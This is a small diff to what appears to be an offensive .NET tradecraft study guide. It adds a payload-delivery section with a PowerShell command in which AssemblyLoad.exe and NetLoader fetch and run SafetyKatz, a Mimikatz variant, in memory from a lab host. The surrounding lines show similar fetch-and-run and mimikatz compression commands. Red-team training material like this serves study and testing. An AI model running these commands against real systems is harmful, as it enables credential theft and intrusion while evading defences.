@@ -633,6 +633,7 @@ $ Out-CompressedDll <Path to mimikatz.exe> > outputfilename.txt
 ![](https://i.imgur.com/FwiuSFo.png)
 
 
+## **Offensive .NET - Tradecraft - Payload Delivery**
 
 
 - We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
@@ -645,5 +646,10 @@ $ C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
 
 
 - We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
+
+
+```powershell
+$ C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+```
 
 
